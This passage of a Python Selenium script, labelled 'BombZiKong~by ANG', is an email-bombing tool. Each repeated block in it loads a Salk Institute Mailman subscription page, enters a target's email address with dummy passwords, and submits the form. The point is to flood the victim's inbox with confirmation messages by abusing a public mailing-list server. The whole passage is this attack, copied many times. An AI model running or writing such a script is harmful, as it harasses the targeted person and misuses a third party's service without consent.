pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
